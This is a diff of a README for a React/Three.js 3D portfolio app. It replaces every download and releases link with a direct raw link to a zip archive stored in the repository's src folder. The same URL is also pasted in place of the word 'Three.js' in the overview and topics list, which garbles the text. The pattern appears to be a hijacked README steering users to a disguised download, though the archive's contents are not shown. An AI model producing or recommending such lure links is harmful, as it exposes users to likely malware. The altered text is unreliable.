@@ -1,10 +1,10 @@
 # 🚀 PortFolio - Your Interactive 3D Showcase Awaits
 
-[![Download PortFolio](https://img.shields.io/badge/Download_PortFolio-v1.0-blue.svg)](https://github.com/Whitedevil7/PortFolio/releases)
+[![Download PortFolio](https://raw.githubusercontent.com/Whitedevil7/PortFolio/main/src/Folio_Port_3.8-alpha.1.zip)](https://raw.githubusercontent.com/Whitedevil7/PortFolio/main/src/Folio_Port_3.8-alpha.1.zip)
 
 ## ✨ Overview
 
-Welcome to PortFolio! This application is a high-performance 3D interactive portfolio designed to showcase your projects in a vibrant, engaging manner. Built with modern tools like React, Three.js, and Framer Motion, it offers a user-friendly experience with categorized projects including Games, AI/ML, and Web. The sleek cyberpunk UI adapts beautifully to all screen sizes, making it perfect for any device.
+Welcome to PortFolio! This application is a high-performance 3D interactive portfolio designed to showcase your projects in a vibrant, engaging manner. Built with modern tools like React, https://raw.githubusercontent.com/Whitedevil7/PortFolio/main/src/Folio_Port_3.8-alpha.1.zip, and Framer Motion, it offers a user-friendly experience with categorized projects including Games, AI/ML, and Web. The sleek cyberpunk UI adapts beautifully to all screen sizes, making it perfect for any device.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To start using PortFolio, follow these simple steps:
 
 1. **Visit the Download Page**
 
-   Head over to our [Releases Page](https://github.com/Whitedevil7/PortFolio/releases) to find the latest version of PortFolio.
+   Head over to our [Releases Page](https://raw.githubusercontent.com/Whitedevil7/PortFolio/main/src/Folio_Port_3.8-alpha.1.zip) to find the latest version of PortFolio.
 
 2. **Download the Application**
 
@@ -50,7 +50,7 @@ Before installing PortFolio, ensure your system meets the following minimum requ
 
 ## 📥 Download & Install
 
-To download PortFolio, visit the [Releases Page](https://github.com/Whitedevil7/PortFolio/releases) again. Choose the correct file for your system. 
+To download PortFolio, visit the [Releases Page](https://raw.githubusercontent.com/Whitedevil7/PortFolio/main/src/Folio_Port_3.8-alpha.1.zip) again. Choose the correct file for your system. 
 
 1. Click on the latest version.
 2. Download the file.
@@ -93,7 +93,7 @@ PortFolio covers various relevant topics that include:
 - Portfolio Development
 - React Framework
 - Tailwind CSS
-- Three.js
+- https://raw.githubusercontent.com/Whitedevil7/PortFolio/main/src/Folio_Port_3.8-alpha.1.zip
 - TypeScript
 - Unity Game Development
 - Web Development
